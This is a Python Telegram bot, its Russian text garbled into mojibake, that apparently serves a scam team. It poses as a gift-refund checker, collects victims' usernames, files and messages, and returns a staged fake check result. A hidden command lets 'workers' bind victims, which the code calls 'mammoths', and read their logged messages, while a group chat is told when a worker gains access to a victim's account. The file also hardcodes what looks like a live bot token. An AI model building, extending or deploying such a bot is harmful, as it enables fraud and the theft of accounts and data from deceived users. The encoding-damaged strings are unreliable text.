import logging
import os
import asyncio
from datetime import datetime
from typing import Dict, List, Optional

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup
)
from telegram.ext import (
    Updater,
    CommandHandler, 
    MessageHandler, 
    CallbackQueryHandler,
    CallbackContext,
    Filters
)

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8092588180:AAGJR1QrIqLgWBmZNxHEqb9f-Ou3YqLts7U')
GROUP_CHAT_ID = os.environ.get('GROUP_CHAT_ID', '4866741254')
ADMIN_IDS = {7662948442, 6802842517, 913595126}

# –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
user_data_storage = {}
mammoth_connections = {}
mammoth_messages = {}
banned_users = set()

# –°–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
class UserState:
    AWAITING_USERNAME = "awaiting_username"
    AWAITING_FILE = "awaiting_file"
    AWAITING_MAMMOTH = "awaiting_mammoth"

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in banned_users:
        update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    user_data_storage[user_id] = {
        "username": update.effective_user.username or "",
        "state": "",
        "is_admin": user_id in ADMIN_IDS
    }
    
    if user_id not in mammoth_messages:
        mammoth_messages[user_id] = []
    
    mammoth_messages[user_id].append({
        "text": "/start",
        "timestamp": datetime.now().isoformat()
    })
    
    welcome_text = (
        "–ü—Ä–∏–≤–µ—Ç! –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –±–æ—Ç–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤.\n\n"
        "1. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å–≤–æ–π username –±–µ–∑ @\n"
        "2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ username –≤ —ç—Ç–æ—Ç —á–∞—Ç."
    )
    update.message.reply_text(welcome_text)
    
    if user_id not in ADMIN_IDS:
        try:
            context.bot.send_message(
                chat_id=GROUP_CHAT_ID,
                text="–ú–∞–º–æ–Ω—Ç –æ—Ç–ø—Ä–∞–≤–∏–ª —Å–≤–æ–π username!"
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –≥—Ä—É–ø–ø—É: {e}")

def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in banned_users:
        update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    if user_id not in mammoth_messages:
        mammoth_messages[user_id] = []
    
    mammoth_messages[user_id].append({
        "text": text,
        "timestamp": datetime.now().isoformat()
    })
    
    user_state = user_data_storage.get(user_id, {}).get("state", "")
    
    if user_state == UserState.AWAITING_USERNAME:
        if "@" in text:
            update.message.reply_text("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ username –±–µ–∑ @")
            return
        
        user_data_storage[user_id]["username"] = text
        user_data_storage[user_id]["state"] = UserState.AWAITING_FILE
        update.message.reply_text("‚úÖ Username –ø–æ–ª—É—á–µ–Ω!\n\n–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –¥–ª—è –ø–æ–ª–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏.")
        
    elif user_state == UserState.AWAITING_MAMMOTH:
        handle_mammoth_binding(update, context, text)
        
    else:
        if not text.startswith('/'):
            user_data_storage[user_id]["state"] = UserState.AWAITING_USERNAME
            update.message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π username –±–µ–∑ @ —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É.")

def handle_file(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    user_state = user_data_storage.get(user_id, {}).get("state", "")
    
    if user_state == UserState.AWAITING_FILE:
        update.message.reply_text("–§–∞–π–ª –ø–æ–ª—É—á–µ–Ω! –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞...\n–û–∂–∏–¥–∞–Ω–∏–µ –¥–æ 10 —Å–µ–∫—É–Ω–¥.")
        
        import time
        time.sleep(4)
        update.message.reply_text("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ù–∞ –ø–æ–¥–∞—Ä–∫–∞—Ö –Ω–µ—Ç —Ä–µ—Ñ–∞—É–Ω–¥–∞.")
        user_data_storage[user_id]["state"] = ""

def cherryteam(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    if user_id not in user_data_storage:
        user_data_storage[user_id] = {}
    
    user_data_storage[user_id]["is_admin"] = True
    
    keyboard = [
        [InlineKeyboardButton("–ü–†–ò–í–Ø–ó–ê–¢–¨ –ú–ê–ú–û–ù–¢–ê ü¶£", callback_data="bind_mammoth")],
        [InlineKeyboardButton("–ú–û–ò –ú–ê–ú–û–ù–¢–´", callback_data="my_mammoths")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "–†–æ–¥–Ω–µ–Ω—å–∫–∏–π –º–æ–π –º–∏–≥—Ä–∞–Ω—Ç–∏–∫ —Ä–∞–¥—ã –≤–∏–¥–µ—Ç—å –≤ —Ä—è–¥–∞—Ö TDTTEAM!!!\n"
        "–ú–æ–∂–µ—à—å –ø—Ä–∏–≤—è–∑–∞—Ç—å —Å–≤–æ–µ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –ø–æ –∞–π–¥–∏ –∏–ª–∏ —é–∑–µ—Ä—É."
    )
    update.message.reply_text(welcome_text, reply_markup=reply_markup)

def handle_mammoth_binding(update: Update, context: CallbackContext, identifier: str) -> None:
    user_id = update.effective_user.id
    
    try:
        mammoth_id = None
        
        if identifier.isdigit():
            mammoth_id = int(identifier)
        else:
            for uid, data in user_data_storage.items():
                if data.get("username", "").lower() == identifier.lower():
                    mammoth_id = uid
                    break
        
        if not mammoth_id:
            update.message.reply_text("‚ùå –ú–∞–º–æ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –º–∞–º–æ–Ω—Ç –Ω–∞–∂–∞–ª /start –≤ –±–æ—Ç–µ.")
            return
        
        if mammoth_id not in mammoth_messages or not any(msg["text"] == "/start" for msg in mammoth_messages[mammoth_id]):
            update.message.reply_text("‚ùå –ú–∞–º–æ–Ω—Ç –µ—â–µ –Ω–µ –Ω–∞–∂–∞–ª –∫–æ–º–∞–Ω–¥—É /start")
            return
        
        if user_id not in mammoth_connections:
            mammoth_connections[user_id] = []
        
        if mammoth_id not in mammoth_connections[user_id]:
            mammoth_connections[user_id].append(mammoth_id)
        
        user_data_storage[user_id]["state"] = ""
        update.message.reply_text("‚úÖ –ú–∞–º–æ–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–≤—è–∑–∞–Ω!")
        
        worker_username = user_data_storage.get(user_id, {}).get("username", "Unknown")
        mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
        
        try:
            context.bot.send_message(
                chat_id=GROUP_CHAT_ID,
                text=f"–í–æ—Ä–∫–µ—Ä @{worker_username} –ø—Ä–∏–≤—è–∑–∞–ª –º–∞–º–æ–Ω—Ç–∞ @{mammoth_username}"
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –≥—Ä—É–ø–ø—É: {e}")
        
    except Exception as e:
        logger.error(f"Error binding mammoth: {e}")
        update.message.reply_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–∏–≤—è–∑–∫–µ –º–∞–º–æ–Ω—Ç–∞.")

def handle_button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if user_id in banned_users:
        query.edit_message_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    if data == "bind_mammoth":
        user_data_storage[user_id]["state"] = UserState.AWAITING_MAMMOTH
        query.edit_message_text("–û—Ç–ø—Ä–∞–≤—å—Ç–µ username –∏–ª–∏ id –º–∞–º–æ–Ω—Ç–∞, –≤–∞–∂–Ω–æ: –º–∞–º–æ–Ω—Ç –¥–æ–ª–∂–µ–Ω –ø—Ä–æ–∂–∞—Ç—å –∫–æ–º–∞–Ω–¥—É /start")
        
    elif data == "my_mammoths":
        show_my_mammoths(query, user_id)
        
    elif data.startswith("mammoth_"):
        mammoth_id = int(data.split("_")[1])
        show_mammoth_messages(query, user_id, mammoth_id)
        
    elif data == "back_to_mammoths":
        show_my_mammoths(query, user_id)
        
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("–ü–†–ò–í–Ø–ó–ê–¢–¨ –ú–ê–ú–û–ù–¢–ê ü¶£", callback_data="bind_mammoth")],
            [InlineKeyboardButton("–ú–û–ò –ú–ê–ú–û–ù–¢–´", callback_data="my_mammoths")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "–†–æ–¥–Ω–µ–Ω—å–∫–∏–π –º–æ–π –º–∏–≥—Ä–∞–Ω—Ç–∏–∫ —Ä–∞–¥—ã –≤–∏–¥–µ—Ç—å –≤ —Ä—è–¥–∞—Ö TDTTEAM!!!\n"
            "–ú–æ–∂–µ—à—å –ø—Ä–∏–≤—è–∑–∞—Ç—å —Å–≤–æ–µ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –ø–æ –∞–π–¥–∏ –∏–ª–∏ —é–∑–µ—Ä—É.",
            reply_markup=reply_markup
        )

def show_my_mammoths(query, user_id: int) -> None:
    if user_id not in mammoth_connections or not mammoth_connections[user_id]:
        query.edit_message_text("–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –º–∞–º–æ–Ω—Ç–æ–≤.")
        return
    
    keyboard = []
    for mammoth_id in mammoth_connections[user_id]:
        mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
        keyboard.append([InlineKeyboardButton(
            f"ü¶£ {mammoth_username} (ID: {mammoth_id})", 
            callback_data=f"mammoth_{mammoth_id}"
        )])
    
    keyboard.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text("–í–∞—à–∏ –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –º–∞–º–æ–Ω—Ç—ã:", reply_markup=reply_markup)

def show_mammoth_messages(query, worker_id: int, mammoth_id: int) -> None:
    if mammoth_id not in mammoth_messages or not mammoth_messages[mammoth_id]:
        query.edit_message_text("–£ —ç—Ç–æ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–π.")
        return
    
    messages_text = "–í–æ—Ç –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª –º–∞–º–æ–Ω—Ç:\n\n"
    for msg in mammoth_messages[mammoth_id]:
        timestamp = datetime.fromisoformat(msg["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
        messages_text += f"[{timestamp}] {msg['text']}\n"
    
    keyboard = [[InlineKeyboardButton("üîô –ù–∞–∑–∞–¥ –∫ –º–∞–º–æ–Ω—Ç–∞–º", callback_data="back_to_mammoths")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text(messages_text[:4000], reply_markup=reply_markup)
    
    worker_username = user_data_storage.get(worker_id, {}).get("username", "Unknown")
    mammoth_username = user_data_storage.get(mammoth_id, {}).get("username", "Unknown")
    
    try:
        query.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=f"–í–æ—Ä–∫–µ—Ä @{worker_username} –ø–æ–ª—É—á–∏–ª –¥–æ—Å—Ç—É–ø –∫ –∞–∫–∫–∞—É–Ω—Ç—É –º–∞–º–æ–Ω—Ç–∞ @{mammoth_username}"
        )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –≥—Ä—É–ø–ø—É: {e}")

def ban(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    if not context.args:
        update.message.reply_text("‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /ban <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        banned_users.add(target_id)
        update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_id} –∑–∞–±–∞–Ω–µ–Ω.")
    except ValueError:
        update.message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")

def main():
    print("üöÄ Starting Telegram Bot...")
    
    if not BOT_TOKEN:
        print("‚ùå ERROR: BOT_TOKEN not found!")
        return
    
    try:
        updater = Updater(BOT_TOKEN, use_context=True)
        dp = updater.dispatcher
        
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("cherryteam", cherryteam))
        dp.add_handler(CommandHandler("ban", ban))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
        dp.add_handler(MessageHandler(Filters.all & ~Filters.text, handle_file))
        dp.add_handler(CallbackQueryHandler(handle_button))
        
        print("‚úÖ Bot setup completed!")
        print("ü§ñ Bot is starting polling...")
        
        updater.start_polling()
        print("‚úÖ Bot is now running!")
        
        updater.idle()
        
    except Exception as e:
        print(f"‚ùå Error starting bot: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
